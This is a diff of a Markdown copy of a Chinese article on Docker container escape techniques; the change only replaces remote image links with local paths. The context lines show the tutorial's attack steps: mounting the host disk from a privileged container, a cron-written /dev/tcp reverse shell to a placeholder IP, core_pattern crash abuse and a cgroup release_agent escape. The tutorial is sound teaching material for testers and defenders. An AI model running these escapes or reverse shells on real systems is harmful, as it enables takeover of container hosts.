@@ -57,7 +57,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xDNAxknjSY3PPPdxa_GcqQ)
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/hiaiaLeG6N1zItD3hicyicTUxCsdYyvSZWKOQ4y3CslMX5EINOxRsoicGxHxJnwtXjIau4usI94yHUKXTqh4LyuVL4A/640?wx_fmt=gif)
+![](../../.resource/remote/5b10f034761100b4ee075fb18da4c900365a736783c27a56435d646416f0e19b.gif)
 
 **写在前面**
 
@@ -275,7 +275,7 @@ docker run --privileged <容器image name>
 
 先创建一个特权模式的容器，查看状态，CapEff 的值表示当前为特权模式 。
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyfG54xA63YGWNTXicrE8h8XMDU7jhVDZictVcgT894ZqVSiaFJKPKFYq4g/640?wx_fmt=png)
+![图片](../../.resource/remote/a801076358c1008b24982c5de6e3153668555694c5cdf9eb1d6511e51f2fab5d.png)
 
 在 docker 容器内找个目录新建一个文件夹，然后将宿主机的根目录挂载到当前目录中（这里如果不存在特权用户，但 docker 容器配置不当 - 进行危险挂载，是同样的风险，之后可以用相同的利用方式）。
 
@@ -296,11 +296,11 @@ ls /dev
 
 ```
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyWy8hxxVTQlJNGfiazVfAxYeUdtUQdu60viasT4Mh5Oia3Mib9Uhw9NgksA/640?wx_fmt=png)
+![图片](../../.resource/remote/a0d3770c3d51d327005dbfc19cd89e8692e4232f2349f70c697c2d2e8bcd0406.png)
 
 同样的镜像创建的非特权模式用户 ls /dev 情况为：
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyfFkv82icJ8asWDZTuydORN9eruV14dZlSatpfhdEkhCBx86z3hMXcXw/640?wx_fmt=png)
+![图片](../../.resource/remote/99130f0eaa9063c0cf8d0a41b0e1c6058c7989e3565843416ba0f8ad155701eb.png)
 
 将 / dev/vda1 挂载至新建的文件夹，这时候我们已经可以获取到宿主机的所有文件夹，可以任意读取修改宿主机的文件。进行挂载目录:
 
@@ -309,7 +309,7 @@ mount /dev/vda1 /1234
 
 ```
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyicbKBHHSqzGGQN1IMoTeCmj4xUEWZA7vIMbP1Tkjx5wn47dXzFk6qBw/640?wx_fmt=png)
+![图片](../../.resource/remote/f8d85074a2269b0e7030bc81b89eecaf2da67a292ad41c53fe9c28111d61800f.png)
 
 之后写计划任务执行反弹 shell 命令即可。
 
@@ -322,7 +322,7 @@ echo '* * * * * bash -i >& /dev/tcp/xxx.xxx.xxx.xx/5555 0>&1' >> /1111/var/spool
 
 等一会，就能获取到 webshell。
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkylzd1t9e86kbJL6oaiaZp8HJtcE3V72ejMrmhPX9ZCKYTsHwibbgcMQgw/640?wx_fmt=png)
+![图片](../../.resource/remote/7271a14e33d13830f8aad4d06acf113f8ff2844803f89c73859d96820e00affd.png)
 
 PS：需要注意一点，如果在利用过程中发现 vim 修改失败（宿主机文件实际未修改成功）可以留意一下，问题原因可参考:
 
@@ -360,7 +360,7 @@ find / -name docker.sock
 
 ```
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkylibrnzAjx1g5ibN21yEco61XxMR7JcHylghl2OkFBSLKK0Bu2ZCjZlsQ/640?wx_fmt=png)
+![图片](../../.resource/remote/bafb4949aaacf21b3dacbf0e63b119bccc8309fc33dcc91650f0e40a36a45883.png)
 
 在 docker 中使用命令查看宿主机拉取的镜像。 
 
@@ -398,11 +398,11 @@ find / -name core_pattern
 
 如果结果存在两个 core_pattern 文件，则可能存在挂载 procfs。
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TDcApeaFf9UTopImtBGibyAyJHliaehFOib6E5mKFaT9NicQf3je1Pc8licA/640?wx_fmt=png)
+![图片](../../.resource/remote/10ad3411c89b2f1f87157fc1f67c3f02d92e1dcc6862377f5e6f806286dd3927.png)
 
 一般我们安全的是只显示一个 。
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyyxDpc6zKHxPCbx4Wh4VzMLbGKXoYyfQSUrywibtDHoG5rnFwL8EBlicA/640?wx_fmt=png)
+![图片](../../.resource/remote/758baf495b6cd0cb2138b81b282677534156507974ec561154cd743742f4bd8f.png)
 
 利用过程：
 
@@ -461,7 +461,7 @@ var/lib/docker/overlay2/db944ef403ea1d31dcb81a408763980582637b40c8c8cd6168aa918a
 
 * 左右滑动查看更多
 
-![](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TfJZvazbmuqlsLcA6v0aFEnoV2lZtyOnuVFTISLEahXo18a5Bqbd9icA/640?wx_fmt=png)
+![](../../.resource/remote/937067937bc61824654bd17715c90ddeca4ad407009474639ec18a47b415b58a.png)
 
 2、再一个触发进程崩溃的 C 语言：
 
@@ -475,7 +475,7 @@ return 0;
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TlsFCCKpMuowJ5m6QOVBManxcwZZicfg7z61EX4W9ChBelvoaGYatuXw/640?wx_fmt=png)
+![](../../.resource/remote/a9dff43d83e3259962d40b3948d7e34b9044836cd08f8a36eb76f0256cf14d94.png)
 
 3、通过 echo，将需要执行的内容写入到共享的 / proc 目录下的 core_pattern 文件中：
 
@@ -499,7 +499,7 @@ echo -e "|/var/lib/docker/overlay2/db944ef403ea1d31dcb81a408763980582637b40c8c8c
 
 执行触发崩溃的 C 文件，成功反弹 shell。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31T8Z5xYZ80ujpYfB4IXXxqzj2nwfWByw14Gibcxlj8HcqOGXFwERYiaiaIA/640?wx_fmt=png)
+![](../../.resource/remote/4d017569f9b6861ec9053a72047825dbce336b1b64d29377dee66fd9c43d8c74.png)
 
 _**2.3 逃逸方法三：相关启动参数存在安全问题**_
 
@@ -579,9 +579,9 @@ https://blog.csdn.net/qq_55316925/article/details/128511304 SYS_PTRACE+SYS_Modul
 
 笔者测试了一下个人的几台服务器，装 centos 的天翼云确实没有，而装了 ubunt 的阿里云和本地 kali 虚拟机都安装了 AppArmor。
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TcoxmzNFDTZLInWVzzCQl3GNCKaibviaHvJY1WPjwAhCF32B2zcZbZ94Q/640?wx_fmt=png)
+![图片](../../.resource/remote/cd24a9e86849ac7f2c19839541e7cc0cd3c9d149ea0b558a9389681716d5afcb.png)
 
-![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TzTHFia1iaZ4tfyQIK2TCBezz1fVIE3tfV6uchVlsbT6Qcw13YkuibqvbA/640?wx_fmt=jpeg)
+![图片](../../.resource/remote/78f07d497f14b441318c7e881232fabc454d3955dc2767a281b103deda0d327a.jpg)
 
 利用 EXP：
 
@@ -633,11 +633,11 @@ sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"
 
 写入需要执行的 shell 命令，进行反弹：
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31Tjq7VcSC66ictYy7cb17MuUXEa3tluiaDa6J6BEkZKTCVkF9SXKkVmGSw/640?wx_fmt=png)
+![图片](../../.resource/remote/614247fe6f890614d801f8756e67df090bec07bd49d0ff140696bf107d612a2a.png)
 
 成功获得宿主机的 shell：
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TYZoaaxwywyogqABkq39yU1cyKQEAWtbfuh59xbcPBjE8xFwH6JPXcA/640?wx_fmt=png)
+![图片](../../.resource/remote/2ec5d69dff1435d0ca56c141f1445d874f4b7856139db40f3215009a4d184295.png)
 
 具体触发过程机制描述：
 
@@ -700,7 +700,7 @@ cat /proc/1/status | grep Cap
 
 查看当前的 Capabilities 权限： 
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyfmk3CyjhBQT2UrM7Kia0D65wc0SB5ovcBictUKxicJyn7I2rlfvOU2Q0w/640?wx_fmt=png)
+![图片](../../.resource/remote/ff422af71eb7c65122b84e95873fe975b354d4b02fcc59e3f756c301c08cc32a.png)
 
 *   CapInh（可继承的 capabilities）：表示当前用户可以从父进程继承的 capabilities。
     
@@ -713,11 +713,11 @@ cat /proc/1/status | grep Cap
 
 再通过 capsh --decode=00000000a80425fb 命令的输出来确定当前用户的 capabilities（功能权限）。 
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkysZH1OsyGpVVRIp0j7mNg1RxcZI5ZFetibIoaLciaaLXrficC07xtJd0Og/640?wx_fmt=png)
+![图片](../../.resource/remote/4466a126f6421b13f19b49c566f9d8dd8438b24f5690c76f4ae7a4a0052c3604.png)
 
 也可以直接通过 getpcaps $$ 获取。 
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyeUPfxaOTYgumFV3aeQibtQsI19gEr8WH2jQr0rxUjGr0P4uu39QmqJA/640?wx_fmt=png)
+![图片](../../.resource/remote/100b9d25e948ef006f30c7495777d61dfbfda0aa3b5930e3a708669023a1a86d.png)
 
 一些常见的权限判断示例： 
 
@@ -743,7 +743,7 @@ p 表示 permitted（允许权限），表示进程可以拥有的权限。这�
 
 查找 CapPrm 字段中是否包含需要判断的 capability，如果存在，则表示当前用户具有该 capability 权限。 
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkysZH1OsyGpVVRIp0j7mNg1RxcZI5ZFetibIoaLciaaLXrficC07xtJd0Og/640?wx_fmt=png)
+![图片](../../.resource/remote/4466a126f6421b13f19b49c566f9d8dd8438b24f5690c76f4ae7a4a0052c3604.png)
 
 2、判断是否具有执行特定命令的权限： 
 
@@ -825,17 +825,17 @@ _**二、代码审计工程师实习生（25/26 届）**_**
 
 **往期回顾**
 
-[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zJAh2UJXqVYIq8n7HKuMNKHXW1PI1oMiaKxZC8VzIK6rKxqM04u0uo0YlD7MW1ic3IaZwmmMhW1STMg/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247526171&idx=1&sn=c519411b5d5a645a1e4a3d6c3d0b8300&chksm=9ae12623ad96af350aad16f3756d8cdfec0bb9a7fcdf2f062751f988f9c18c1f998500b80dc3&scene=21#wechat_redirect)
+[![图片](../../.resource/remote/058ddd46d7e952b6bc72e07ac5f08a7f6dd67e13e0984567bef2a22ab7f1cfc5.jpg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247526171&idx=1&sn=c519411b5d5a645a1e4a3d6c3d0b8300&chksm=9ae12623ad96af350aad16f3756d8cdfec0bb9a7fcdf2f062751f988f9c18c1f998500b80dc3&scene=21#wechat_redirect)
 
-[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zJAh2UJXqVYIq8n7HKuMNKHLZRfE71LoibXpobhxra6wdjCAdsOn4C0SW8xv9sVT8eVFGMWjFicyBUQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247525850&idx=1&sn=9d5a10bc2a3ec850853a177c4f78d028&chksm=9ae124e2ad96adf496a21b39d08ce293ec22b5b13438aef9c218d770a725b08c9219d76efc6b&scene=21#wechat_redirect)
+[![图片](../../.resource/remote/5b529a9d1ccd2f995453ee74ad0e9b39686cea397596bc4f6032173798fdd336.jpg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247525850&idx=1&sn=9d5a10bc2a3ec850853a177c4f78d028&chksm=9ae124e2ad96adf496a21b39d08ce293ec22b5b13438aef9c218d770a725b08c9219d76efc6b&scene=21#wechat_redirect)
 
-[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zJAh2UJXqVYIq8n7HKuMNKH3yGFQ2cunzibF9BRlb12SlYsZOQtKVoPdQochoSJC0eVxbiaicq0o5h0g/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247525850&idx=2&sn=c4367a195f68dc49ceaa6c4e6bb2b395&chksm=9ae124e2ad96adf434752bc29dd50b8ac1ae6c80bd099e9d94432dc5eb87a3db54d0308b497f&scene=21#wechat_redirect)
+[![图片](../../.resource/remote/812415d311bdc33efd6f3d630d3c95c75363779122b82444750876c665adab27.jpg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247525850&idx=2&sn=c4367a195f68dc49ceaa6c4e6bb2b395&chksm=9ae124e2ad96adf434752bc29dd50b8ac1ae6c80bd099e9d94432dc5eb87a3db54d0308b497f&scene=21#wechat_redirect)
 
-[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zKElhBP0Ht29XSLqh4H5Ey7ibyIrAxEUfNAKV2wicJgt5Dv7l96iafmP6rdR8EcpnQjdoyueYYoxWxsQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247525580&idx=1&sn=f89c7e327fbfb351898bc3a4d71432d6&chksm=9ae125f4ad96ace2f62a6de76300ce168699b3dac03dfa30f1f72c2c51395851c5e6faa3f011&scene=21#wechat_redirect)
+[![图片](../../.resource/remote/964f49ba0f15fae48bd224e03d2fcbf9ad5ed7b8d08d23c111091df966f8fdd5.jpg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247525580&idx=1&sn=f89c7e327fbfb351898bc3a4d71432d6&chksm=9ae125f4ad96ace2f62a6de76300ce168699b3dac03dfa30f1f72c2c51395851c5e6faa3f011&scene=21#wechat_redirect)
 
-[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TXicZ64KQ0QUASfZKxRiapYynDxibLfC2p48eR1e8xU4KcPWmJJrcLgwLw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247525289&idx=1&sn=856b2729a5ffc9086f316dca9e707e1a&chksm=9ae12291ad96ab8700099698fd5bb48cba22861dbfd673b8bb25bdf8cb4bb3d8554e075dc7a6&scene=21#wechat_redirect)
+[![图片](../../.resource/remote/14fb2df87038a5874a2c4f39342b801f136415272bdfc3b2ac17e3a99d82cf26.jpg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247525289&idx=1&sn=856b2729a5ffc9086f316dca9e707e1a&chksm=9ae12291ad96ab8700099698fd5bb48cba22861dbfd673b8bb25bdf8cb4bb3d8554e075dc7a6&scene=21#wechat_redirect)
 
-![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Ljib4So7yuWjVsaTygX5CCGxuYZaPeibrpfOOGAjXfTkTp3AIPeXv08iayGTH94Xcmvk4RJxs9NNSc2vzCoCiaXOSQ/640?wx_fmt=jpeg&wx_co=1&wxfrom=5&wx_lazy=1)
+![图片](../../.resource/remote/f7ca1dd32fea5f7064899e26e060835e28574d1e652535bb2121c186b056f435.jpg)
 
   
 
@@ -843,11 +843,11 @@ _**二、代码审计工程师实习生（25/26 届）**_**
 
 **安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。**
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zIFIDZlXFuQeZrcKrV7Zd8Aeg98Fw5jzbGBgUW1hVQXIV3YpLZncEYibgw7MFwWtDU5vwnE2QFVP7A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+![图片](../../.resource/remote/b2e01b3db8b52ca4debf6e4ebf993d14390b365d946d233beae8d0b81c12ebcd.png)
 
-![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zL31gt4m6YIRLh7wJeOSwYPOIblCvhN6OgHhV9NMJNH0TBianlpMmRbaKG1ia7iaPsWb4UX4ImgfEJ0A/640?wx_fmt=jpeg&wx_co=1&wxfrom=5&wx_lazy=1)
+![图片](../../.resource/remote/d5cbcbaa43264750129ccd42b437a977a594dd8e9039c2d52d7e7c258f081fb2.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/hiaiaLeG6N1zItD3hicyicTUxCsdYyvSZWKOCUgD3ep5Jp4DE8e2S2Y3WnxsKjicicOg3OsGGRc9NPibQ61aRAqNXZQDA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)
+![](../../.resource/remote/16f8f9c08357b833a89ba1c12f47c5778d7dbcb63b4d19ab0dfa0dea3d015fa5.gif)
 
 ---
 
